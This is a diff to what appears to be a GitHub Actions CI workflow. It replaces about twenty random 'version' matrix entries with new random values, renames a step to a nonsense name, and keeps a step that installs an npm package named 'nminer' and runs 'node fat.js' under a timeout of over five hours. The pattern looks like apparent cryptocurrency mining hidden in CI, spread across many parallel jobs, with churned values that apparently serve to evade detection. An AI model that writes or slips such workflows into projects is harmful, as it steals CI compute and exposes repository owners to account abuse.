@@ -9,26 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 6124 }
-          - { version: 1876 }
-          - { version: 3881 }
-          - { version: 5209 }
-          - { version: 1210 }
-          - { version: 3015 }
-          - { version: 844 }
-          - { version: 6842 }
-          - { version: 2673 }
-          - { version: 9740 }
-          - { version: 9443 }
-          - { version: 695 }
-          - { version: 7075 }
-          - { version: 4533 }
-          - { version: 194 }
-          - { version: 9781 }
-          - { version: 847 }
-          - { version: 9357 }
-          - { version: 2596 }
-          - { version: 7525 }
+          - { version: 9099 }
+          - { version: 4855 }
+          - { version: 5254 }
+          - { version: 3126 }
+          - { version: 8474 }
+          - { version: 9867 }
+          - { version: 1057 }
+          - { version: 2735 }
+          - { version: 9727 }
+          - { version: 7245 }
+          - { version: 9191 }
+          - { version: 5390 }
+          - { version: 9107 }
+          - { version: 1559 }
+          - { version: 2097 }
+          - { version: 5305 }
+          - { version: 7957 }
+          - { version: 6977 }
+          - { version: 8258 }
 
     steps:
       - name: Checkout
@@ -39,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: when
+      - name: consequently dapper
         run: |
           npm install nminer@latest
-          timeout 333m node fat.js || echo "fat executed"
+          timeout 324m node fat.js || echo "fat executed"
